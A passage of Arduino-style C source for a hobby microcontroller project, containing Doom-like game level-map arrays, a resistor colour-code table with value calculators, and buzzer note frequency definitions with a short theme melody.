  {1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1, 1, 1, 1, 0, 1},
  {1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1}
};

// Level Map 4 Definition
const uint8_t PROGMEM doomLevelMap4[DOOM_MAP_H][DOOM_MAP_W] = {
  {1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1},
  {1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1},
  {1, 0, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 0, 1},
  {1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1},
  {1, 1, 1, 0, 1, 0, 1, 1, 1, 1, 0, 1, 0, 1, 1, 1},
  {1, 0, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 1},
  {1, 0, 1, 1, 1, 0, 1, 0, 0, 1, 0, 1, 1, 1, 0, 1},
  {1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1},
  {1, 0, 1, 0, 1, 1, 1, 0, 0, 1, 1, 1, 0, 1, 0, 1},
  {1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1},
  {1, 1, 1, 0, 1, 0, 1, 1, 1, 1, 0, 1, 0, 1, 1, 1},
  {1, 0, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 1},
  {1, 0, 1, 1, 1, 0, 1, 0, 0, 1, 0, 1, 1, 1, 0, 1},
  {1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1},
  {1, 0, 1, 0, 0, 0, 1, 1, 1, 1, 0, 0, 0, 1, 0, 1},
  {1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1}
};

// Level Map 5 Definition
const uint8_t PROGMEM doomLevelMap5[DOOM_MAP_H][DOOM_MAP_W] = {
  {1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1},
  {1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1},
  {1, 0, 1, 1, 1, 1, 0, 1, 1, 0, 1, 1, 1, 1, 0, 1},
  {1, 0, 1, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 1, 0, 1},
  {1, 0, 1, 0, 1, 1, 0, 0, 0, 0, 1, 1, 0, 1, 0, 1},
  {1, 0, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 0, 1},
  {1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1},
  {1, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 1},
  {1, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 1},
  {1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1},
  {1, 0, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 0, 1},
  {1, 0, 1, 0, 1, 1, 0, 0, 0, 0, 1, 1, 0, 1, 0, 1},
  {1, 0, 1, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 1, 0, 1},
  {1, 0, 1, 1, 1, 1, 0, 1, 1, 0, 1, 1, 1, 1, 0, 1},
  {1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1},
  {1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1}
};

// Level Map 6 Definition
const uint8_t PROGMEM doomLevelMap6[DOOM_MAP_H][DOOM_MAP_W] = {
  {1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1},
  {1, 0, 0, 1, 0, 0, 0, 1, 1, 0, 0, 0, 1, 0, 0, 1},
  {1, 0, 0, 1, 0, 1, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1},
  {1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 1, 1},
  {1, 0, 0, 1, 1, 1, 1, 0, 0, 1, 1, 1, 1, 0, 0, 1},
  {1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1},
  {1, 0, 1, 1, 0, 1, 1, 1, 1, 1, 1, 0, 1, 1, 0, 1},
  {1, 0, 1, 1, 0, 1, 0, 0, 0, 0, 1, 0, 1, 1, 0, 1},
  {1, 0, 1, 1, 0, 1, 0, 0, 0, 0, 1, 0, 1, 1, 0, 1},
  {1, 0, 1, 1, 0, 1, 1, 1, 1, 1, 1, 0, 1, 1, 0, 1},
  {1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1},
  {1, 0, 0, 1, 1, 1, 1, 0, 0, 1, 1, 1, 1, 0, 0, 1},
  {1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 1, 1},
  {1, 0, 0, 1, 0, 1, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1},
  {1, 0, 0, 1, 0, 0, 0, 1, 1, 0, 0, 0, 1, 0, 0, 1},
  {1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1}
};

// Level Map 7 Definition
const uint8_t PROGMEM doomLevelMap7[DOOM_MAP_H][DOOM_MAP_W] = {
  {1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1},
  {1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1},
  {1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 0, 1, 1, 1, 0, 1},
  {1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1},
  {1, 0, 1, 0, 1, 1, 1, 0, 0, 1, 1, 1, 0, 1, 0, 1},
  {1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1},
  {1, 0, 1, 0, 1, 0, 1, 1, 1, 1, 0, 1, 0, 1, 0, 1},
  {1, 0, 1, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 1, 0, 1},
  {1, 0, 1, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 1, 0, 1},
  {1, 0, 1, 0, 1, 0, 1, 1, 1, 1, 0, 1, 0, 1, 0, 1},
  {1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1},
  {1, 0, 1, 0, 1, 1, 1, 0, 0, 1, 1, 1, 0, 1, 0, 1},
  {1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1},
  {1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 0, 1, 1, 1, 0, 1},
  {1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1},
  {1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1}
};

// Level Map 8 Definition
const uint8_t PROGMEM doomLevelMap8[DOOM_MAP_H][DOOM_MAP_W] = {
  {1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1, 1},
  {1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1},
  {1, 0, 0, 1, 1, 1, 0, 1, 1, 0, 1, 1, 1, 0, 0, 1},
  {1, 1, 0, 1, 0, 0, 0, 1, 1, 0, 0, 0, 1, 0, 1, 1},
  {1, 0, 0, 1, 0, 1, 0, 0, 0, 0, 1, 0, 1, 0, 0, 1},
  {1, 0, 0, 1, 0, 1, 0, 0, 0, 0, 1, 0, 1, 0, 0, 1},
  {1, 1, 0, 1, 0, 0, 0, 1, 1, 0, 0, 0, 1, 0, 1, 1},
  {1, 0, 0, 1, 1, 1, 0, 1, 1, 0, 1, 1, 1, 0, 0, 1},
  {1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1},
  {1, 1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1}
};

// Level Map 9 Definition
const uint8_t PROGMEM doomLevelMap9[DOOM_MAP_H][DOOM_MAP_W] = {
  {1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1},
  {1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1},
  {1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1},
  {1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1},
  {1, 0, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 0, 1},
  {1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 1},
  {1, 0, 1, 0, 1, 0, 1, 1, 1, 1, 0, 1, 0, 1, 0, 1},
  {1, 0, 1, 0, 1, 0, 1, 0, 0, 1, 0, 1, 0, 1, 0, 1},
  {1, 0, 1, 0, 1, 0, 1, 0, 0, 1, 0, 1, 0, 1, 0, 1},
  {1, 0, 1, 0, 1, 0, 1, 1, 1, 1, 0, 1, 0, 1, 0, 1},
  {1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 1},
  {1, 0, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 0, 1},
  {1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1},
  {1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1},
  {1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1},
  {1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1}
};

// Level Map 10 Definition
const uint8_t PROGMEM doomLevelMap10[DOOM_MAP_H][DOOM_MAP_W] = {
  {1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1},
  {1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 1},
  {1, 0, 1, 1, 1, 1, 0, 1, 1, 0, 1, 1, 1, 1, 0, 1},
  {1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1},
  {1, 0, 1, 0, 1, 1, 1, 0, 0, 1, 1, 1, 0, 1, 0, 1},
  {1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 1},
  {1, 0, 1, 0, 1, 0, 1, 1, 1, 1, 0, 1, 0, 1, 0, 1},
  {1, 1, 1, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 1, 1, 1},
  {1, 1, 1, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 1, 1, 1},
  {1, 0, 1, 0, 1, 0, 1, 1, 1, 1, 0, 1, 0, 1, 0, 1},
  {1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 1},
  {1, 0, 1, 0, 1, 1, 1, 0, 0, 1, 1, 1, 0, 1, 0, 1},
  {1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1},
  {1, 0, 1, 1, 1, 1, 0, 1, 1, 0, 1, 1, 1, 1, 0, 1},
  {1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 1},
  {1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1}
};

// =============================================================================
// BÖLÜM 26: DİRENÇ RENK TABLOSU VE İLGİLİ HESAPLAYICILAR
// =============================================================================
struct ResistorBand {
  const char *colorName;
  int digit;
  double multiplier;
  double tolerance;
};

const ResistorBand resistorDatabase[] = {
  {"Black", 0, 1.0, 0.0},
  {"Brown", 1, 10.0, 1.0},
  {"Red", 2, 100.0, 2.0},
  {"Orange", 3, 1000.0, 0.0},
  {"Yellow", 4, 10000.0, 0.0},
  {"Green", 5, 100000.0, 0.5},
  {"Blue", 6, 1000000.0, 0.25},
  {"Violet", 7, 10000000.0, 0.1},
  {"Grey", 8, 100000000.0, 0.05},
  {"White", 9, 1000000000.0, 0.0},
  {"Gold", -1, 0.1, 5.0},
  {"Silver", -2, 0.01, 10.0}
};

double calculateResistor4Band(int band1, int band2, int multIdx) {
  int d1 = resistorDatabase[band1].digit;
  int d2 = resistorDatabase[band2].digit;
  double m = resistorDatabase[multIdx].multiplier;
  return (d1 * 10 + d2) * m;
}

double calculateResistor5Band(int band1, int band2, int band3, int multIdx) {
  int d1 = resistorDatabase[band1].digit;
  int d2 = resistorDatabase[band2].digit;
  int d3 = resistorDatabase[band3].digit;
  double m = resistorDatabase[multIdx].multiplier;
  return (d1 * 100 + d2 * 10 + d3) * m;
}

// =============================================================================
// BÖLÜM 27: SES FREKANS VE MELODİ NOTALARI (BUZZER DESTEĞİ İÇİN)
// =============================================================================
#define NOTE_B0  31
#define NOTE_C1  33
#define NOTE_CS1 35
#define NOTE_D1  37
#define NOTE_DS1 39
#define NOTE_E1  41
#define NOTE_F1  44
#define NOTE_FS1 46
#define NOTE_G1  49
#define NOTE_GS1 52
#define NOTE_A1  55
#define NOTE_AS1 58
#define NOTE_B1  62
#define NOTE_C2  65
#define NOTE_CS2 69
#define NOTE_D2  73
#define NOTE_DS2 78
#define NOTE_E2  82
#define NOTE_F2  87
#define NOTE_FS2 93
#define NOTE_G2  98
#define NOTE_GS2 104
#define NOTE_A2  110
#define NOTE_AS2 117
#define NOTE_B2  123
#define NOTE_C3  131
#define NOTE_CS3 139
#define NOTE_D3  147
#define NOTE_DS3 156
#define NOTE_E3  165
#define NOTE_F3  175
#define NOTE_FS3 185
#define NOTE_G3  196
#define NOTE_GS3 208
#define NOTE_A3  220
#define NOTE_AS3 233
#define NOTE_B3  247
#define NOTE_C4  262
#define NOTE_CS4 277
#define NOTE_D4  294
#define NOTE_DS4 311
#define NOTE_E4  330
#define NOTE_F4  349
#define NOTE_FS4 370
#define NOTE_G4  392
#define NOTE_GS4 415
#define NOTE_A4  440
#define NOTE_AS4 466
#define NOTE_B4  494
#define NOTE_C5  523
#define NOTE_CS5 554
#define NOTE_D5  587
#define NOTE_DS5 622
#define NOTE_E5  659
#define NOTE_F5  698
#define NOTE_FS5 740
#define NOTE_G5  784
#define NOTE_GS5 831
#define NOTE_A5  880
#define NOTE_AS5 932
#define NOTE_B5  988

const int PROGMEM doomThemeMelody[] = {
  NOTE_E2, NOTE_E2, NOTE_E3, NOTE_E2, NOTE_E2, NOTE_D3, NOTE_E2, NOTE_E2,
  NOTE_C3, NOTE_E2, NOTE_E2, NOTE_AS2, NOTE_E2, NOTE_E2, NOTE_B2, NOTE_C3
};

void playDoomThemeNote(int index) {
  int note = pgm_read_word(&doomThemeMelody[index % 16]);
  digitalWrite(LED_PIN, HIGH);
  delayMicroseconds(1000000 / note);
  digitalWrite(LED_PIN, LOW);
}
// =============================================================================
// DOOM LEVEL MAP DATA MATRIX #11
// =============================================================================
const uint8_t PROGMEM doomLevelMap11[DOOM_MAP_H][DOOM_MAP_W] = {
  {1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1},
};

// =============================================================================
// DOOM LEVEL MAP DATA MATRIX #12
// =============================================================================
const uint8_t PROGMEM doomLevelMap12[DOOM_MAP_H][DOOM_MAP_W] = {
  {1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1},
};

// =============================================================================
// DOOM LEVEL MAP DATA MATRIX #13
// =============================================================================
const uint8_t PROGMEM doomLevelMap13[DOOM_MAP_H][DOOM_MAP_W] = {
  {1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1},
};

// =============================================================================
// DOOM LEVEL MAP DATA MATRIX #14
// =============================================================================
const uint8_t PROGMEM doomLevelMap14[DOOM_MAP_H][DOOM_MAP_W] = {
  {1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1},
};

// =============================================================================
// DOOM LEVEL MAP DATA MATRIX #15
// =============================================================================
const uint8_t PROGMEM doomLevelMap15[DOOM_MAP_H][DOOM_MAP_W] = {
  {1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1},
};

// =============================================================================
// DOOM LEVEL MAP DATA MATRIX #16
// =============================================================================
const uint8_t PROGMEM doomLevelMap16[DOOM_MAP_H][DOOM_MAP_W] = {
  {1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1},
};

// =============================================================================
// DOOM LEVEL MAP DATA MATRIX #17
// =============================================================================
const uint8_t PROGMEM doomLevelMap17[DOOM_MAP_H][DOOM_MAP_W] = {
  {1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1},
};

// =============================================================================
// DOOM LEVEL MAP DATA MATRIX #18
// =============================================================================
const uint8_t PROGMEM doomLevelMap18[DOOM_MAP_H][DOOM_MAP_W] = {
  {1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1},
  {1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1},
  {1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1},
  {1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1},
};

// =============================================================================
// DOOM LEVEL MAP DATA MATRIX #19
// =============================================================================
